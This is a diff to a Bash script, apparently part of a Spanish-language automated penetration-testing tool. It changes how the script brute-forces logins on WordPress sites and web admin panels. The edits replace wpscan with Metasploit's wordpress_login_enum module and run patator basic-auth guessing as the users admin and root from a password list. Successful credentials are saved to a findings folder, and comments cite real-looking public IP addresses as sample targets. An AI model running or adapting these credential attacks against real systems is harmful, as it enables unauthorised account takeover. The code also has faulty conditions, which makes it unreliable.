@@ -106,10 +106,10 @@ then
 			fingerprint=`echo $line | cut -d ";" -f 2`
 			echo -e "\n\t########### $ip_port_path #######"
 			
-			ip_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107:80
-			path=`echo $ip_port_path | cut -d "/" -f 4`		
+			ip_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107:80			
 			ip=`echo $ip_port | cut -d ":" -f 1`
 			port=`echo $ip_port | cut -d ":" -f 2`
+			path=`echo $ip_port_path | cut -d "/" -f 4`		
 #			echo "webData.pl -t $ip -d $path -p $port -e todo -l /dev/null -r 4 "			
 			echo ""
 			if [[ $fingerprint = *"wordpress"* ]]; then
@@ -119,13 +119,29 @@ then
 					#https://181.115.188.36:443/				
 					for user in $(cat .vulnerabilidades2/"$ip"_"$port"_wpusers.txt); do
 						echo -e "\t\t[+] Probando con usuario $user"
-						wpscan --url $ip_port_path --wordlist `pwd`/top.txt --username $user >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						#$ip = dominio
+						if [[ ${ip} == *"bo"* || ${ip} == *"com"*  || ${ip} == *"net"* || ${ip} != *"org"* || ${ip} != *"net"* ]];then 
+							real_ip=`host $ip | head -1 | cut -d " " -f4` 
+							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						else
+							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						fi
 					done
 				else
 					echo -e "\t\t[+] Probando con usuario admin"
-					wpscan --url $ip_port_path --wordlist `pwd`/top.txt  --username admin >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+					#$ip = dominio
+						if [[ ${ip} == *"bo"* || ${ip} == *"com"*  || ${ip} == *"net"* || ${ip} != *"org"* || ${ip} != *"net"* ]];then 
+							real_ip=`host $ip | head -1 | cut -d " " -f4` 
+							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						else
+							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						fi										
 				fi						
-				grep --color=never 'Successful' logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$ip"_"$port"_wordpressPass.txt 									
+				grep --color=never 'SUCCESSFUL' logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$ip"_"$port"_wordpressPass.txt 									
 			fi	
 			
 			if [[ $fingerprint = *"phpmyadmin"* ]]; then
@@ -328,40 +344,45 @@ then
 			
 			if [[ ${line} == *"http"*  ]];then 							
 				#line = http://200.87.193.109:80/phpmyadmin/
-				ip=`echo $line | cut -d ":" -f2 | tr -d "/"`
+				ip=`echo $line | cut -d ":" -f2 | tr -d "/"`			
+				port=`echo $line | cut -d "/" -f 3| cut -d ":" -f2`	
 				
 				#probar con usuario admin
-				patator http_fuzz method=GET url="http://$ip/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_80-passwordAdivinado.txt 2> logs/cracking/"$ip"_80_passwordAdivinado1.txt
-				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_80_passwordAdivinado1.txt`
+				patator http_fuzz method=GET url="$line" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
+				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
 				greprc=$?
 				if [[ $greprc -eq 0 ]] ; then
-					echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_80_passwordAdivinado.txt
+					echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt
 				fi	
 				
 				#probar con usuario root
-				patator http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_80_passwordAdivinado.txt 2> logs/cracking/"$ip"_80_passwordAdivinado2.txt			
+				patator http_fuzz method=GET url="$line" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
 				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_80_passwordAdivinado2.txt`
 				greprc=$?
 				if [[ $greprc -eq 0 ]] ; then
-					echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_80_passwordAdivinado.txt
+					echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt
 				fi
 							
 			else
-				#line=10.0.0.2
-				#probar con usuario admin
-				patator http_fuzz method=GET url="http://$line/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$line"_80-passwordAdivinado.txt 2> logs/cracking/"$line"_80_passwordAdivinado1.txt
-				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_80_passwordAdivinado1.txt`
-				greprc=$?
-				if [[ $greprc -eq 0 ]] ; then
-					echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$line"_80_passwordAdivinado.txt
-				fi	
+				#line=10.0.0.2:80
+				ip=`echo $line | cut -f1 -d":"`
+				port=`echo $line | cut -f2 -d":"`
+				if [[ ${port} == *"443"*  ]];then 	
+					#probar con usuario admin
+					patator http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$line"_"$port"_passwordAdivinado.txt 2> logs/cracking/"$line"_"$port"_passwordAdivinado1.txt
+					respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
+					greprc=$?
+					if [[ $greprc -eq 0 ]] ; then
+						echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$line"_"$port"_passwordAdivinado.txt
+					fi	
 				
-				#probar con usuario root
-				patator http_fuzz method=GET url="http://$line/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$line"_80_passwordAdivinado.txt 2> logs/cracking/"$line"_80_passwordAdivinado2.txt			
-				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_80_passwordAdivinado2.txt`
-				greprc=$?
-				if [[ $greprc -eq 0 ]] ; then
-					echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$line"_80_passwordAdivinado.txt
+					#probar con usuario root
+					patator http_fuzz method=GET url="http://$line/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$line"_"$port"_passwordAdivinado.txt 2> logs/cracking/"$line"_"$port"_passwordAdivinado2.txt			
+					respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
+					greprc=$?
+					if [[ $greprc -eq 0 ]] ; then
+						echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$line"_"$port"_passwordAdivinado.txt
+					fi
 				fi
 			fi
 						
